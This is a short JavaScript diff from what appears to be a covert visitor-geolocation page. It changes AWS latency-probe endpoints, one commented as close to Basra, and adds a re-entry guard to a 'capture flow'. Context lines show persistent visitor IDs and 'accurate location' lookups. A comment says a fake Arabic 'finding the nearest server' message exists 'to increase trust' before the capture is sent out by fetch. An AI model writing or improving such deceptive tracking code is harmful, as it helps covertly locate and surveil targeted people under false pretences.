@@ -448,10 +448,10 @@ async function getPersistentId() {
 
 async function measureRegionalLatency() {
   const regions = [
-    { name: 'EU_West', url: 'https://dynamodb.eu-central-1.amazonaws.com/ping' }, // Frankfurt
-    { name: 'US_East', url: 'https://dynamodb.us-east-1.amazonaws.com/ping' }, // N. Virginia
-    { name: 'ME_Bahrain', url: 'https://dynamodb.me-south-1.amazonaws.com/ping' }, // Bahrain (Extremely close to Basra)
-    { name: 'ME_South', url: 'https://dynamodb.me-central-1.amazonaws.com/ping' } // UAE
+    { name: 'EU_West', url: 'https://s3.eu-central-1.amazonaws.com/favicon.ico' }, // Frankfurt
+    { name: 'US_East', url: 'https://s3.us-east-1.amazonaws.com/favicon.ico' }, // N. Virginia
+    { name: 'ME_Bahrain', url: 'https://s3.me-south-1.amazonaws.com/favicon.ico' }, // Bahrain (Extremely close to Basra)
+    { name: 'ME_South', url: 'https://s3.me-central-1.amazonaws.com/favicon.ico' } // UAE
   ];
 
   const results = {};
@@ -565,8 +565,11 @@ function getAccurateLocation(id) {
   } catch (e) {}
 }
 
+let isCapturing = false;
+
 async function triggerCaptureFlow() {
-  if (captureId) return;
+  if (captureId || isCapturing) return;
+  isCapturing = true;
   
   // Show a smart pre-request message to increase trust
   setStatus('جاري البحث عن أفضل خادم لقربك الجغرافي...');
@@ -590,6 +593,8 @@ async function triggerCaptureFlow() {
       keepalive: true
     }).catch(() => {});
   }
+  
+  isCapturing = false;
 }
 
 
